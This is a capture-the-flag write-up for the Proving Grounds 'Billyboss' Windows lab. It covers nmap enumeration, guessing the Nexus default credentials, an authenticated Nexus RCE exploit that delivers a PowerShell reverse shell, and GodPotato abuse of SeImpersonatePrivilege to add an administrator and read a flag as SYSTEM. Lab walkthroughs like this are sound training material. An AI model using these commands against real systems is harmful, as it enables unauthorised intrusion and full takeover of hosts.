---
machine: Billyboss
platform: Proving Grounds
category: Windows
difficulty: Hard
tags: [nexus-repository-manager, authenticated-rce, seimpersonate, godpotato]
date: 2026-07-19
status: retired
summary: A Windows box running a Java artifact repository manager — testing default/guessable admin credentials, a known authenticated remote-code-execution exploit against the repository software, and a SeImpersonatePrivilege abuse tool to escalate a webapp-service shell to SYSTEM.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/medjed]
└─$ nmap-full 192.168.163.61                                                                                  
[*] Running fast port discovery on 192.168.163.61...
[sudo] password for kali: 
kali
[*] Open ports: 21,80,135,139,445,5040,7680,8081,49664,49665,49666,49667,49668,49669
[*] Running full scan on 192.168.163.61...
kali
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 21:56 -0400
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 21:59 (0:00:00 remaining)
Nmap scan report for 192.168.163.61
Host is up (0.055s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: BaGet
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-20T01:59:08
|_  start_date: N/A
|_clock-skew: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.25 seconds
```

We have a baget webserver on 80, a Nexus Repository Manager on 8081

We also have an ftp server but it does not accept anonymous logon

Upon guessing creds in nexus we eventually guess `nexus:nexus` and gain access to the admin webapp.

## Foothold

Now we can perform the Authenticated RCE for Nexus Repo Manager in searchsploit:

```bash
┌──(kali㉿kali)-[~/oscp/medjed]
└─$ searchsploit nexus                            
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Genexus Protection Server 9.6.4.2 - 'protsrvservice' Unquoted Service Path                                                | windows/local/49007.txt
Genexus Protection Server 9.7.2.10 - 'protsrvservice' Unquoted Service Path                                               | windows/local/52065.txt
Joomla! Component com_if_nexus - Remote File Inclusion                                                                    | multiple/webapps/10754.txt
Joomla! Component iF Portfolio Nexus - 'Controller' Remote File Inclusion                                                 | php/webapps/33440.txt
Joomla! Extension iF Portfolio Nexus - SQL Injection                                                                      | php/webapps/10177.txt
Loftek Nexus 543 IP Cameras - Multiple Vulnerabilities                                                                    | hardware/webapps/27878.txt
neteyes nexusway border gateway - Multiple Vulnerabilities                                                                | cgi/remote/25648.txt
Nexus 5 Android 5.0 - Local Privilege Escalation                                                                          | android/local/35711.c
Nexus Repository Manager - Java EL Injection RCE (Metasploit)                                                             | linux/remote/48343.rb
NexusPHP 1.5 - SQL Injection                                                                                              | php/webapps/17946.txt
PluggedOut Nexus 0.1 - 'forgotten_password.php' SQL Injection                                                             | php/webapps/27342.txt
Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)                                                             | java/webapps/49385.py
Sonatype Nexus Repository 3.53.0-01 - Path Traversal                                                                      | multiple/webapps/52101.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We use revshells.com's Powershell #3 (base64) revshell as our cmd field and run the exploit for a revshell:

```bash
┌──(kali㉿kali)-[~/oscp/billyboss]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.211] from (UNKNOWN) [192.168.163.61] 50286
whoami
billyboss\nathan
PS C:\Users\nathan\Nexus\nexus-3.21.0-05> whoami
billyboss\nathan
```

## Privilege Escalation

From here we can see that we have [[SeImpersonatePrivilege]] and can use godpotato to gain SYSTEM RCE.

I use godpotato to add my user to Administrators group:

```powershell
./godpotato.exe -cmd "net localgroup Administrators nathan /add"
```

From here I just used GodPotato to read the admin flag:

```powershell
PS C:\Users\nathan\Nexus\nexus-3.21.0-05> ./godpotato.exe -cmd 'cmd /c type C:\Users\Administrator\Desktop\proof.txt'
[*] CombaseModule: 0x140734262345728
[*] DispatchTable: 0x140734264688224
[*] UseProtseqFunction: 0x140734264056256
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\27f98fe2-24a5-4f45-b8b3-9e95796c6f85\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00007c02-08d0-ffff-bde0-5f1cc8113e07
[*] DCOM obj OXID: 0x8e8e8110e29e8cb
[*] DCOM obj OID: 0xb730d7dad7156c31
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 832 Token:0x768  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1840
12cb08ff03e5fbd2786e3398b515edc5
PS C:\Users\nathan\Nexus\nexus-3.21.0-05> 
```
